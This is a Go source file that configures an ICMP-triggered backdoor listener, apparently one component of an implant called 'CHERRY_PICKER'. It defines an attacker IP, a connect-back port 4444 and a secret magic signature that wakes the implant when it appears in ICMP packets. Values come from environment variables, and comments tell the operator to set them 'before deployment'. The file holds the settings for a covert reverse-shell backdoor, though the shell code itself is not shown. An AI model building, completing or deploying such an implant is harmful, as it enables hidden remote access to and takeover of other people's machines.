package main

import (
	"encoding/hex"
	"fmt"
	"os"
)

// Config holds the configuration for the ICMP listener
type Config struct {
	AttackIP       string // IP address to connect back to
	AttackPort     int    // Port to connect back to
	MagicSignature []byte // Magic bytes to look for in ICMP payload
}

// DefaultConfig returns a default configuration
// IMPORTANT: Modify these values before deployment
func DefaultConfig() *Config {
	return &Config{
		AttackIP:       "192.168.1.100",              // Change to your attack box IP
		AttackPort:     4444,                         // Change to your listening port
		MagicSignature: []byte("CHERRY_PICKER_2025"), // Change to your secret signature
	}
}

// LoadConfig loads configuration from environment variables or returns defaults
func LoadConfig() *Config {
	cfg := DefaultConfig()

	if ip := os.Getenv("ATTACK_IP"); ip != "" {
		cfg.AttackIP = ip
	}

	if port := os.Getenv("ATTACK_PORT"); port != "" {
		fmt.Sscanf(port, "%d", &cfg.AttackPort)
	}

	if sig := os.Getenv("MAGIC_SIG"); sig != "" {
		if decoded, err := hex.DecodeString(sig); err == nil {
			cfg.MagicSignature = decoded
		}
	}

	return cfg
}

// Validate checks if the configuration is valid
func (c *Config) Validate() error {
	if c.AttackIP == "" {
		return fmt.Errorf("attack IP cannot be empty")
	}
	if c.AttackPort < 1 || c.AttackPort > 65535 {
		return fmt.Errorf("attack port must be between 1 and 65535")
	}
	if len(c.MagicSignature) == 0 {
		return fmt.Errorf("magic signature cannot be empty")
	}
	return nil
}
